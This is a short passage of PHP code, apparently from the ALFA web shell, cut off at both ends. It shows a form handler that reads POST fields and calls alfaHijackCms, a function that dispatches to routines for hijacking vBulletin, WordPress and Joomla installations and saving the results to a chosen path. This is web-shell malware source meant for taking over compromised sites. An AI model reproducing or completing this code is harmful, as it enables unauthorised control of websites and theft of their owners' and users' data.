<input type="submit" name="btn" value=" "></form></center><br>';
$cms = $_POST['alfa1'];
$saveto = $_POST['alfa2'];
$cmspath = $_POST['alfa4'];
if(!empty($cms) AND !empty($saveto) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
echo __pre();
alfaHijackCms($cms,$cmspath,$saveto);
}
echo '</div>';
alfafooter();
}
function alfaHijackCms($cms,$cmspath,$saveto){
switch($cms){
case "vb":
hijackvBulletin($cmspath,$saveto);
break;
case "wp":
hijackwp($cmspath,$saveto);
break;
case "jom":
